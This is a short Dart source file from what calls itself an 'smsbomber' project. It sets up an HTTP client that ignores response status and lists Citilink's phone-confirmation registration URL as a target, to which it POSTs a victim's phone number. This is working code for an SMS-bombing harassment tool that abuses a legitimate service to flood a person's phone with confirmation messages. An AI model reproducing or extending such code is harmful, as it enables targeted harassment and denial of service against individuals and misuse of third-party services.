part of smsbomber;

final _dio = Dio(BaseOptions(validateStatus: (status) => true));

enum Country { RU }
const countyList = {"RU": Country.RU};

final serviceList = [
  Service(
      name: "Citilink",
      country: Country.RU,
      url: Uri(
          scheme: "https", host: "www.citilink.ru", path: "registration/confirm/phone/+7{phone}"),
      process: (service, phone) => _dio.post(
            service.url.toString().replaceFirst("%7Bphone%7D", "$phone"),
          ))
];
